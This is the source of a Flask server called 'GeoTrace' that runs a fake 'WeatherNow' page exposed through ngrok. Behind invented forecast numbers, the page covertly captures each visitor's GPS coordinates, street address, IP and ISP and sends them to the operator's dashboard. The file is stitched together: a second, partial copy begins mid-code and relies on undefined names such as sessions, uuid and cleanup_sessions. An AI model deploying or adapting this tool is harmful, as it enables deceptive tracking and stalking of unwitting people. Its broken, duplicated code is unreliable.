"""
GeoTrace Backend Server v2
pip install flask flask-cors pyngrok requests
python server.py
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests, threading, time

app = Flask(__name__)
CORS(app)

captured_locations = []
ngrok_url = None

# ── NGROK ──────────────────────────────────────────────
def start_ngrok():
    global ngrok_url
    try:
        from pyngrok import ngrok, conf
        # conf.get_default().auth_token = "YOUR_NGROK_TOKEN"
        tunnel = ngrok.connect(5000, "http")
        ngrok_url = tunnel.public_url
        print(f"\n{'='*55}")
        print(f"  NGROK URL   : {ngrok_url}")
        print(f"  Fake Weather: {ngrok_url}/weather")
        print(f"{'='*55}\n")
    except Exception as e:
        print(f"[Ngrok] {e} — running local only")

# ── IP INFO ────────────────────────────────────────────
def get_ip_info(ip=None):
    try:
        fields = "status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,query"
        url = f"http://ip-api.com/json/{ip}?fields={fields}" if ip else f"http://ip-api.com/json/?fields={fields}"
        d = requests.get(url, timeout=6).json()
        if d.get("status") == "success":
            return {"status":"success","ip":d.get("query",""),"city":d.get("city",""),
                    "region":d.get("regionName",""),"country":d.get("country",""),
                    "country_code":d.get("countryCode",""),"lat":d.get("lat"),
                    "lon":d.get("lon"),"isp":d.get("isp",""),"org":d.get("org",""),
                    "timezone":d.get("timezone",""),"zip":d.get("zip","")}
        return {"status":"fail","message":d.get("message","failed")}
    except Exception as e:
        return {"status":"fail","message":str(e)}

# ── REVERSE GEOCODE ─────────────────────────────────────
def reverse_geocode(lat, lon):
    try:
        # zoom:18 = most precise (building/house level)
        d = requests.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat":lat,"lon":lon,"format":"json","zoom":18,"addressdetails":1},
            headers={"User-Agent":"GeoTrace/2.0"}, timeout=8).json()
        a = d.get("address", {})

        # Most precise city-level name (priority order)
        city = (
            a.get("city") or
            a.get("town") or
            a.get("village") or
            a.get("suburb") or
            a.get("neighbourhood") or
            a.get("quarter") or
            a.get("hamlet") or
            a.get("county") or
            a.get("municipality") or
            "Unknown"
        )

        # Most precise road/street name
        road = (
            a.get("road") or
            a.get("pedestrian") or
            a.get("footway") or
            a.get("path") or
            a.get("cycleway") or
            ""
        )

        # House number + road for max precision
        house = a.get("house_number","")
        full_road = (house + " " + road).strip() if house else road

        return {
            "city":         city,
            "suburb":       a.get("suburb","") or a.get("neighbourhood",""),
            "state":        a.get("state",""),
            "state_district": a.get("state_district",""),
            "country":      a.get("country",""),
            "country_code": a.get("country_code","").upper(),
            "postcode":     a.get("postcode",""),
            "road":         full_road,
            "house_number": house,
            "display":      d.get("display_name",""),
        }
    except Exception as e:
        print(f"[GeoCode Error] {e}")
        return {"city":"Unknown","error":str(e)}

# ── ROUTES ─────────────────────────────────────────────
@app.route("/api/ip")
def api_my_ip():
    fwd = request.headers.get("X-Forwarded-For","")
    ip  = fwd.split(",")[0].strip() if fwd else request.remote_addr
    if ip in ("127.0.0.1","::1"): ip = None
    return jsonify(get_ip_info(ip))

@app.route("/api/ip/<ip>")
def api_ip_lookup(ip):
    return jsonify(get_ip_info(ip))

@app.route("/api/reverse")
def api_reverse():
    lat = request.args.get("lat")
    lon = request.args.get("lon") or request.args.get("lng")
    if not lat or not lon:
        return jsonify({"error":"lat and lon required"}), 400
    return jsonify(reverse_geocode(lat, lon))

@app.route("/api/ngrok-url")
def api_ngrok_url():
    return jsonify({"url": ngrok_url or "http://localhost:5000"})

@app.route("/api/capture", methods=["POST"])
def api_capture():
    data = request.get_json(force=True) or {}
    fwd  = request.headers.get("X-Forwarded-For","")
    data["captured_ip"] = fwd.split(",")[0].strip() if fwd else request.remote_addr
    data["timestamp"]   = time.strftime("%Y-%m-%d %H:%M:%S")
    # server-side reverse geocode — always enrich for GPS captures
    lat = data.get("lat"); lon = data.get("lon") or data.get("lng")
    if lat and lon:
        try:
            lat_f = float(lat); lon_f = float(lon)
        except:
            lat_f = lat; lon_f = lon

        # Always reverse geocode GPS method for max accuracy
        # For IP method, only if city is missing
        if data.get("method") == "gps" or not data.get("city"):
            geo = reverse_geocode(lat_f, lon_f)
            data.update({
                "city":        geo.get("city",""),
                "suburb":      geo.get("suburb",""),
                "state":       geo.get("state",""),
                "country":     geo.get("country",""),
                "country_code":geo.get("country_code",""),
                "road":        geo.get("road",""),
                "postcode":    geo.get("postcode",""),
                "display":     geo.get("display",""),
            })

    # Enrich with ISP data from captured IP
    if not data.get("isp") and data.get("captured_ip"):
        ip_info = get_ip_info(data["captured_ip"])
        if ip_info.get("status") == "success":
            data["isp"]    = ip_info.get("isp","")
            data["org"]    = ip_info.get("org","")
            if not data.get("city"):
                data["city"]    = ip_info.get("city","")
                data["country"] = ip_info.get("country","")

    captured_locations.append(data)
    num = len(captured_locations)
    print(f"\n{'='*50}")
    print(f"  [CAPTURE #{num}] {data['timestamp']}")
    print(f"  Method   : {data.get('method','?').upper()}")
    print(f"  IP       : {data['captured_ip']}  ({data.get('isp','?')}) ")
    print(f"  Location : {data.get('road','')} {data.get('city','?')}, {data.get('state','')} {data.get('country','?')}")
    print(f"  Postcode : {data.get('postcode','?')}")
    print(f"  Coords   : {lat}, {lon}  ±{data.get('accuracy','?')}m")
    print(f"  Full Addr: {data.get('display','—')[:80]}")
    print(f"{'='*50}\n")
    return jsonify({"status":"ok","captured":num})

@app.route("/api/captures")
def api_captures():
    return jsonify(captured_locations)

# ── FAKE WEATHER PAGE ───────────────────────────────────
FAKE_WEATHER_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeatherNow — Live Local Forecast</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(160deg,#0f2b5b,#1a4080 40%,#0a1a3a);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:1.5rem 1rem 3rem}
header{width:100%;max-width:500px;display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
.brand{font-weight:700;font-size:1rem;color:#fff;letter-spacing:1px}.brand span{color:#60b4ff}
nav a{color:rgba(255,255,255,.5);text-decoration:none;font-size:.8rem;margin-left:1.2rem}
nav a:hover{color:#fff}
.card{background:rgba(255,255,255,.1);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,.18);border-radius:28px;padding:2.5rem 2.5rem 2rem;max-width:440px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5)}
.loading{display:flex;flex-direction:column;align-items:center;gap:1.2rem;padding:2rem 0}
.spinner{width:44px;height:44px;border:3px solid rgba(255,255,255,.2);border-top-color:#60b4ff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.load-txt{color:rgba(255,255,255,.6);font-size:.9rem}
#wc{display:none;text-align:center}
.city{font-size:1.9rem;font-weight:700;margin-bottom:.2rem}
.country{font-size:.9rem;color:rgba(255,255,255,.6);margin-bottom:1.8rem}
.wicon{font-size:5.5rem;line-height:1;margin:.5rem 0}
.temp{font-size:5rem;font-weight:200;line-height:1}
.temp sup{font-size:1.8rem;vertical-align:top;margin-top:1rem;font-weight:400}
.cond{font-size:1.1rem;color:rgba(255,255,255,.75);margin:.8rem 0 2rem}
.details{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;border-top:1px solid rgba(255,255,255,.12);padding-top:1.5rem}
.di{text-align:center}.dv{font-size:1.15rem;font-weight:600}
.dl{font-size:.65rem;color:rgba(255,255,255,.5);letter-spacing:1.5px;margin-top:.3rem;text-transform:uppercase}
.fc{display:flex;justify-content:space-between;margin-top:1.8rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.1)}
.fd{text-align:center;font-size:.75rem;color:rgba(255,255,255,.6)}.fi{font-size:1.3rem;margin:.3rem 0}.ft{font-size:.85rem;font-weight:600;color:#fff}
.upd{font-size:.7rem;color:rgba(255,255,255,.35);margin-top:1.5rem;text-align:center}
.err{background:rgba(255,80,80,.15);border:1px solid rgba(255,80,80,.35);border-radius:12px;padding:1.2rem;margin-top:1rem;font-size:.88rem;color:#ffaaaa;text-align:center}
</style>
</head>
<body>
<header>
  <div class="brand">🌤 Weather<span>Now</span></div>
  <nav><a href="#">Forecast</a><a href="#">Radar</a><a href="#">Maps</a><a href="#">Alerts</a></nav>
</header>
<div class="card">
  <div class="loading" id="ld"><div class="spinner"></div><div class="load-txt" id="lt">Detecting your location...</div></div>
  <div id="wc">
    <div class="city" id="cn">—</div><div class="country" id="co">—</div>
    <div class="wicon" id="wi">⛅</div>
    <div class="temp"><span id="wt">--</span><sup>°C</sup></div>
    <div class="cond" id="wc2">Partly cloudy</div>
    <div class="details">
      <div class="di"><div class="dv" id="wh">—</div><div class="dl">Humidity</div></div>
      <div class="di"><div class="dv" id="ww">—</div><div class="dl">Wind</div></div>
      <div class="di"><div class="dv" id="wf">—</div><div class="dl">Feels Like</div></div>
    </div>
    <div class="fc" id="fc"></div>
    <div class="upd" id="upd">Updating...</div>
  </div>
  <div class="err" id="eb" style="display:none">Could not get weather. Please allow location access and reload.</div>
</div>
<script>
var S=window.location.origin;
var ic=['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫','🌬'];
var cd=['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky','Light snow','Mist'];
var dys=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
function r(a){return a[Math.floor(Math.random()*a.length)];}
function rn(a,b){return Math.floor(Math.random()*(b-a))+a;}

function showWeather(city,country){
  document.getElementById('ld').style.display='none';
  document.getElementById('wc').style.display='block';
  document.getElementById('cn').textContent=city;
  document.getElementById('co').textContent=country;
  document.getElementById('wi').textContent=r(ic);
  var t=rn(8,42);
  document.getElementById('wt').textContent=t;
  document.getElementById('wf').textContent=(t-rn(1,6))+'°C';
  document.getElementById('wc2').textContent=r(cd);
  document.getElementById('wh').textContent=rn(30,95)+'%';
  document.getElementById('ww').textContent=rn(3,40)+' km/h';
  document.getElementById('upd').textContent='Last updated: '+new Date().toLocaleTimeString();
  var fc=document.getElementById('fc'),today=new Date();
  fc.innerHTML='';
  for(var i=1;i<=5;i++){
    var d=new Date(today);d.setDate(today.getDate()+i);
    var hi=rn(10,42),lo=hi-rn(3,10);
    fc.innerHTML+='<div class="fd"><div>'+dys[d.getDay()]+'</div><div class="fi">'+r(ic.slice(0,6))+'</div><div class="ft">'+hi+'°/'+lo+'°</div></div>';
  }
}

function cap(data){fetch(S+'/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});}

function tryIP(){
  document.getElementById('lt').textContent='Getting location...';
  fetch(S+'/api/ip').then(function(r){return r.json();}).then(function(d){
    if(d.status==='success'){showWeather(d.city||'Unknown',d.country||'');cap({method:'ip',lat:d.lat,lon:d.lon,city:d.city,country:d.country,ip:d.ip,isp:d.isp});}
    else{document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';}
  }).catch(function(){document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';});
}

if(navigator.geolocation){
  var bestAcc=Infinity,bestLat=null,bestLon=null,captured=false,wid=null;

  function doCapture(lat,lon,acc){
    if(captured)return;
    captured=true;
    if(wid!=null){navigator.geolocation.clearWatch(wid);}
    fetch(S+'/api/reverse?lat='+lat+'&lon='+lon)
      .then(function(r){return r.json();})
      .then(function(d){
        showWeather(d.city||'Your City',d.country||'');
        cap({method:'gps',lat:lat,lon:lon,
             city:d.city,suburb:d.suburb,state:d.state,
             country:d.country,country_code:d.country_code,
             road:d.road,postcode:d.postcode,
             accuracy:Math.round(acc)});
      })
      .catch(function(){
        showWeather('Your Location','');
        cap({method:'gps',lat:lat,lon:lon,accuracy:Math.round(acc)});
      });
  }

  // watchPosition keeps refining — capture when accuracy ≤20m OR after 15s
  var deadline=setTimeout(function(){
    if(!captured&&bestLat!==null){doCapture(bestLat,bestLon,bestAcc);}
    else if(!captured){tryIP();}
  },15000);

  wid=navigator.geolocation.watchPosition(
    function(p){
      var lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
      // Keep best fix seen so far
      if(acc<bestAcc){bestAcc=acc;bestLat=lat;bestLon=lon;}
      // If accuracy is good enough (≤25m), capture immediately
      if(acc<=25&&!captured){
        clearTimeout(deadline);
        doCapture(lat,lon,acc);
      }
    },
    function(e){
      clearTimeout(deadline);
      if(wid!=null){navigator.geolocation.clearWatch(wid);}
      if(!captured){tryIP();}
    },
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}else{tryIP();}
</script>
</body>
</html>"""

@app.route("/weather")
@app.route("/forecast/world")
@app.route("/forecast/<path:p>")
def fake_weather(p=None):
    return FAKE_WEATHER_HTML

@app.route("/")
@app.route("/dashboard")
def dashboard():
    return send_file("index.html")

if __name__ == "__main__":
    print("\n"+"="*55)
    print("  GeoTrace Server v2")
    print("="*55)
    threading.Thread(target=start_ngrok, daemon=True).start()
    time.sleep(2)
    print("  Local: http://localhost:5000")
    print("="*55+"\n")
    app.run(host="0.0.0.0", port=5000, debug=False)                    "country_code":d.get("countryCode",""),"lat":d.get("lat"),
                    "lon":d.get("lon"),"isp":d.get("isp",""),"org":d.get("org",""),
                    "timezone":d.get("timezone",""),"zip":d.get("zip","")}
        return {"status":"fail","message":d.get("message","failed")}
    except Exception as e:
        return {"status":"fail","message":str(e)}

# ── REVERSE GEOCODE ─────────────────────────────────────
def reverse_geocode(lat, lon):
    try:
        d = requests.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat":lat,"lon":lon,"format":"json","zoom":18,"addressdetails":1},
            headers={"User-Agent":"GeoTrace/2.0"}, timeout=8).json()
        a = d.get("address", {})
        city = (a.get("city") or a.get("town") or a.get("village") or
                a.get("suburb") or a.get("neighbourhood") or
                a.get("quarter") or a.get("hamlet") or
                a.get("county") or a.get("municipality") or "Unknown")
        road = (a.get("road") or a.get("pedestrian") or
                a.get("footway") or a.get("path") or a.get("cycleway") or "")
        house = a.get("house_number","")
        full_road = (house + " " + road).strip() if house else road
        return {
            "city":           city,
            "suburb":         a.get("suburb","") or a.get("neighbourhood",""),
            "state":          a.get("state",""),
            "state_district": a.get("state_district",""),
            "country":        a.get("country",""),
            "country_code":   a.get("country_code","").upper(),
            "postcode":       a.get("postcode",""),
            "road":           full_road,
            "house_number":   a.get("house_number",""),
            "display":        d.get("display_name",""),
        }
    except Exception as e:
        print(f"[GeoCode Error] {e}")
        return {"city":"Unknown","error":str(e)}

# ── ROUTES ─────────────────────────────────────────────
@app.route("/api/ip")
def api_my_ip():
    fwd = request.headers.get("X-Forwarded-For","")
    ip  = fwd.split(",")[0].strip() if fwd else request.remote_addr
    if ip in ("127.0.0.1","::1"): ip = None
    return jsonify(get_ip_info(ip))

@app.route("/api/ip/<ip>")
def api_ip_lookup(ip):
    return jsonify(get_ip_info(ip))

@app.route("/api/reverse")
def api_reverse():
    lat = request.args.get("lat")
    lon = request.args.get("lon") or request.args.get("lng")
    if not lat or not lon:
        return jsonify({"error":"lat and lon required"}), 400
    return jsonify(reverse_geocode(lat, lon))

@app.route("/api/ngrok-url")
def api_ngrok_url():
    host = request.host_url.rstrip("/")
    return jsonify({"url": host})

# ── CREATE SESSION ──────────────────────────────────────
@app.route("/api/session", methods=["GET"])
def api_new_session():
    """Dashboard calls this once — gets a unique private token"""
    token = uuid.uuid4().hex
    sessions[token] = {
        "captures":   [],
        "created_at": time.time(),
        "last_seen":  time.time()
    }
    print(f"[Session] Created: {token[:8]}...")
    return jsonify({"token": token})

# ── CAPTURE ─────────────────────────────────────────────
@app.route("/api/capture", methods=["POST"])
def api_capture():
    data  = request.get_json(force=True) or {}
    token = data.get("token","")
    fwd   = request.headers.get("X-Forwarded-For","")
    data["captured_ip"] = fwd.split(",")[0].strip() if fwd else request.remote_addr
    data["timestamp"]   = time.strftime("%Y-%m-%d %H:%M:%S")

    lat = data.get("lat"); lon = data.get("lon") or data.get("lng")
    if lat and lon:
        try: lat_f = float(lat); lon_f = float(lon)
        except: lat_f = lat; lon_f = lon
        if data.get("method") == "gps" or not data.get("city"):
            geo = reverse_geocode(lat_f, lon_f)
            data.update({
                "city":        geo.get("city",""),
                "suburb":      geo.get("suburb",""),
                "state":       geo.get("state",""),
                "country":     geo.get("country",""),
                "country_code":geo.get("country_code",""),
                "road":        geo.get("road",""),
                "postcode":    geo.get("postcode",""),
                "display":     geo.get("display",""),
            })

    if not data.get("isp") and data.get("captured_ip"):
        ip_info = get_ip_info(data["captured_ip"])
        if ip_info.get("status") == "success":
            data["isp"] = ip_info.get("isp","")
            data["org"] = ip_info.get("org","")
            if not data.get("city"):
                data["city"]    = ip_info.get("city","")
                data["country"] = ip_info.get("country","")

    # Save ONLY to correct session
    if token and token in sessions:
        sessions[token]["captures"].append(data)
        sessions[token]["last_seen"] = time.time()
        num = len(sessions[token]["captures"])
    else:
        num = 0  # invalid token — discard silently

    print(f"\n{'='*50}")
    print(f"  [CAPTURE #{num}] {data['timestamp']} | {token[:8] if token else 'NO_TOKEN'}...")
    print(f"  Method   : {data.get('method','?').upper()}")
    print(f"  Location : {data.get('city','?')}, {data.get('country','?')}")
    print(f"  Coords   : {lat}, {lon}  ±{data.get('accuracy','?')}m")
    print(f"{'='*50}\n")
    return jsonify({"status":"ok","captured":num})

# ── GET CAPTURES (token required) ───────────────────────
@app.route("/api/captures")
def api_captures():
    token = request.args.get("token","")
    if not token or token not in sessions:
        return jsonify([])
    sessions[token]["last_seen"] = time.time()
    return jsonify(sessions[token]["captures"])

# ── FAKE WEATHER PAGE ───────────────────────────────────
FAKE_WEATHER_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeatherNow — Live Local Forecast</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(160deg,#0f2b5b,#1a4080 40%,#0a1a3a);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:1.5rem 1rem 3rem}
header{width:100%;max-width:500px;display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
.brand{font-weight:700;font-size:1rem;color:#fff;letter-spacing:1px}.brand span{color:#60b4ff}
nav a{color:rgba(255,255,255,.5);text-decoration:none;font-size:.8rem;margin-left:1.2rem}
.card{background:rgba(255,255,255,.1);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,.18);border-radius:28px;padding:2.5rem 2.5rem 2rem;max-width:440px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5)}
.loading{display:flex;flex-direction:column;align-items:center;gap:1.2rem;padding:2rem 0}
.spinner{width:44px;height:44px;border:3px solid rgba(255,255,255,.2);border-top-color:#60b4ff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.load-txt{color:rgba(255,255,255,.6);font-size:.9rem}
#wc{display:none;text-align:center}
.city{font-size:1.9rem;font-weight:700;margin-bottom:.2rem}
.country{font-size:.9rem;color:rgba(255,255,255,.6);margin-bottom:1.8rem}
.wicon{font-size:5.5rem;line-height:1;margin:.5rem 0}
.temp{font-size:5rem;font-weight:200;line-height:1}
.temp sup{font-size:1.8rem;vertical-align:top;margin-top:1rem;font-weight:400}
.cond{font-size:1.1rem;color:rgba(255,255,255,.75);margin:.8rem 0 2rem}
.details{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;border-top:1px solid rgba(255,255,255,.12);padding-top:1.5rem}
.di{text-align:center}.dv{font-size:1.15rem;font-weight:600}
.dl{font-size:.65rem;color:rgba(255,255,255,.5);letter-spacing:1.5px;margin-top:.3rem;text-transform:uppercase}
.fc{display:flex;justify-content:space-between;margin-top:1.8rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.1)}
.fd{text-align:center;font-size:.75rem;color:rgba(255,255,255,.6)}.fi{font-size:1.3rem;margin:.3rem 0}.ft{font-size:.85rem;font-weight:600;color:#fff}
.upd{font-size:.7rem;color:rgba(255,255,255,.35);margin-top:1.5rem;text-align:center}
.err{background:rgba(255,80,80,.15);border:1px solid rgba(255,80,80,.35);border-radius:12px;padding:1.2rem;margin-top:1rem;font-size:.88rem;color:#ffaaaa;text-align:center}
</style>
</head>
<body>
<header>
  <div class="brand">🌤 Weather<span>Now</span></div>
  <nav><a href="#">Forecast</a><a href="#">Radar</a><a href="#">Maps</a><a href="#">Alerts</a></nav>
</header>
<div class="card">
  <div class="loading" id="ld"><div class="spinner"></div><div class="load-txt" id="lt">Detecting your location...</div></div>
  <div id="wc">
    <div class="city" id="cn">—</div><div class="country" id="co">—</div>
    <div class="wicon" id="wi">⛅</div>
    <div class="temp"><span id="wt">--</span><sup>°C</sup></div>
    <div class="cond" id="wc2">Partly cloudy</div>
    <div class="details">
      <div class="di"><div class="dv" id="wh">—</div><div class="dl">Humidity</div></div>
      <div class="di"><div class="dv" id="ww">—</div><div class="dl">Wind</div></div>
      <div class="di"><div class="dv" id="wf">—</div><div class="dl">Feels Like</div></div>
    </div>
    <div class="fc" id="fc"></div>
    <div class="upd" id="upd">Updating...</div>
  </div>
  <div class="err" id="eb" style="display:none">Could not get weather. Please allow location access and reload.</div>
</div>
<script>
var S   = window.location.origin;
var tkn = new URLSearchParams(window.location.search).get('t') || '';
var ic  = ['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫'];
var cd  = ['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky','Light snow','Mist'];
var dys = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
function r(a){return a[Math.floor(Math.random()*a.length)];}
function rn(a,b){return Math.floor(Math.random()*(b-a))+a;}
function showWeather(city,country){
  document.getElementById('ld').style.display='none';
  document.getElementById('wc').style.display='block';
  document.getElementById('cn').textContent=city;
  document.getElementById('co').textContent=country;
  document.getElementById('wi').textContent=r(ic);
  var t=rn(8,42);
  document.getElementById('wt').textContent=t;
  document.getElementById('wf').textContent=(t-rn(1,6))+'°C';
  document.getElementById('wc2').textContent=r(cd);
  document.getElementById('wh').textContent=rn(30,95)+'%';
  document.getElementById('ww').textContent=rn(3,40)+' km/h';
  document.getElementById('upd').textContent='Last updated: '+new Date().toLocaleTimeString();
  var fc=document.getElementById('fc'),today=new Date();
  fc.innerHTML='';
  for(var i=1;i<=5;i++){
    var d=new Date(today);d.setDate(today.getDate()+i);
    var hi=rn(10,42),lo=hi-rn(3,10);
    fc.innerHTML+='<div class="fd"><div>'+dys[d.getDay()]+'</div><div class="fi">'+r(ic.slice(0,6))+'</div><div class="ft">'+hi+'°/'+lo+'°</div></div>';
  }
}
function cap(data){
  data.token=tkn;
  fetch(S+'/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
}
function tryIP(){
  document.getElementById('lt').textContent='Getting location...';
  fetch(S+'/api/ip').then(function(r){return r.json();}).then(function(d){
    if(d.status==='success'){showWeather(d.city||'Unknown',d.country||'');cap({method:'ip',lat:d.lat,lon:d.lon,city:d.city,country:d.country,ip:d.ip,isp:d.isp});}
    else{document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';}
  }).catch(function(){document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';});
}
if(navigator.geolocation){
  var bestAcc=Infinity,bestLat=null,bestLon=null,captured=false,wid=null;
  function doCapture(lat,lon,acc){
    if(captured)return;captured=true;
    if(wid!=null){navigator.geolocation.clearWatch(wid);}
    fetch(S+'/api/reverse?lat='+lat+'&lon='+lon)
      .then(function(r){return r.json();})
      .then(function(d){
        showWeather(d.city||'Your City',d.country||'');
        cap({method:'gps',lat:lat,lon:lon,city:d.city,suburb:d.suburb,state:d.state,
             country:d.country,country_code:d.country_code,road:d.road,
             postcode:d.postcode,accuracy:Math.round(acc)});
      }).catch(function(){
        showWeather('Your Location','');
        cap({method:'gps',lat:lat,lon:lon,accuracy:Math.round(acc)});
      });
  }
  var deadline=setTimeout(function(){
    if(!captured&&bestLat!==null){doCapture(bestLat,bestLon,bestAcc);}
    else if(!captured){tryIP();}
  },15000);
  wid=navigator.geolocation.watchPosition(
    function(p){
      var lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
      if(acc<bestAcc){bestAcc=acc;bestLat=lat;bestLon=lon;}
      if(acc<=25&&!captured){clearTimeout(deadline);doCapture(lat,lon,acc);}
    },
    function(e){clearTimeout(deadline);if(wid!=null){navigator.geolocation.clearWatch(wid);}if(!captured){tryIP();}},
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}else{tryIP();}
</script>
</body>
</html>"""

@app.route("/weather")
def fake_weather():
    return FAKE_WEATHER_HTML

@app.route("/")
@app.route("/dashboard")
def dashboard():
    return send_file("index.html")

if __name__ == "__main__":
    print("\n"+"="*55)
    print("  GeoTrace Server v2 — Session Mode")
    print("="*55)
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    print("  Local: http://localhost:5000")
    print("="*55+"\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
